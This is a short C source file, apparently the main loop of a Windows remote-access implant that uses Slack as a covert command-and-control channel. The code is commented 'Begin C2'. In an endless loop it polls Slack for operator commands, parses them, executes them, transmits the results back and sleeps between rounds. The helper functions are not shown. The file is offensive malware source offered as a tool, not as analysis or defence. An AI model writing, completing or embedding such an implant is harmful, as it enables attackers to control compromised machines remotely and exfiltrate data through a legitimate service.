#include "Header.h"


int main() {

    //Declare Vars
    char* slackJson = NULL;
    int numElements = 0;
    SlackCmd* cmdArray = NULL;


    // Set working dir
    char* initDir = ".\\";
    size_t len = strlen(initDir) + 1;
    gConfig.currentWorkingDir = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    strcpy_s(gConfig.currentWorkingDir, len, initDir);  
  

    // Begin C2 
    while (TRUE) {
        
        GetFromSlack(&slackJson);

        ParseSlackJSON(slackJson, &cmdArray, &numElements);

        Dispatch(&cmdArray, numElements);

        Transmit(cmdArray, numElements);

        Cleanup(&cmdArray, &numElements, &slackJson);

        Sleep(gConfig.sleepInterval);
    }
}
    